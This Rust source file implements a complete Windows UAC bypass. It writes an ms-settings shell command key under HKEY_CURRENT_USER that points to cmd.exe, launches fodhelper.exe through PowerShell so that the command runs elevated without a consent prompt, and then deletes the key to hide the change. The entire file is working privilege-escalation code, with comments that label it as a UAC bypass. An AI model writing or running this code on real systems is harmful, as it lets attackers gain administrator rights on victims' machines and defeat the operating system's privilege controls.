use winapi::um::winreg::{
    RegCreateKeyExW, RegSetValueExW, RegCloseKey, RegDeleteKeyW, HKEY_CURRENT_USER
};
use winapi::um::winnt::{KEY_WRITE, REG_SZ};
use std::ptr::null_mut;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::process::Command;

fn main() {
    // Define registry path and values
    let sub_key = r"Software\Classes\ms-settings\Shell\Open\command";
    let command = "cmd /c start cmd.exe";
    let delegate_execute = "";

    // Convert strings to null-terminated wide strings (UTF-16)
    let sub_key_wide = to_wide_null(sub_key);
    let command_wide = to_wide_null(command);
    let delegate_execute_wide = to_wide_null(delegate_execute);

    unsafe {
        // Attempt to create or open the registry key
        let mut hkey = null_mut();
        println!("Attempting to create or open the registry key: {}", sub_key);
        // MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw
        if RegCreateKeyExW(HKEY_CURRENT_USER, sub_key_wide.as_ptr(), 0, null_mut(), 0, KEY_WRITE, null_mut(), &mut hkey, null_mut()) == 0 {
            // Set the default value and DelegateExecute value
            println!("Setting the default value to: {}", command);
            // MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexw
            RegSetValueExW(hkey, to_wide_null("").as_ptr(), 0, REG_SZ, command_wide.as_ptr() as *const _, (command_wide.len() * 2) as u32);
            println!("Setting the DelegateExecute value to: {}", delegate_execute);
            RegSetValueExW(hkey, to_wide_null("DelegateExecute").as_ptr(), 0, REG_SZ, delegate_execute_wide.as_ptr() as *const _, (delegate_execute_wide.len() * 2) as u32);

            // Trigger UAC bypass via fodhelper.exe
            println!("Triggering UAC bypass via fodhelper.exe");
            Command::new("powershell").args(&["Start-Process", "C:\\Windows\\System32\\fodhelper.exe"]).status().expect("Failed to execute fodhelper.exe");

            // Sleep for 5
            println!("Sleeping for 5 seconds...");
            std::thread::sleep(std::time::Duration::from_secs(5));

            // Cleanup
            println!("Cleaning up registry key: {}", sub_key);
            // MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdeletekeyw
            RegDeleteKeyW(HKEY_CURRENT_USER, sub_key_wide.as_ptr());
            // MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey
            RegCloseKey(hkey);
        }
    }
}

// Helper function to convert Rust string slices to wide strings
fn to_wide_null(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0).into_iter()).collect()
}
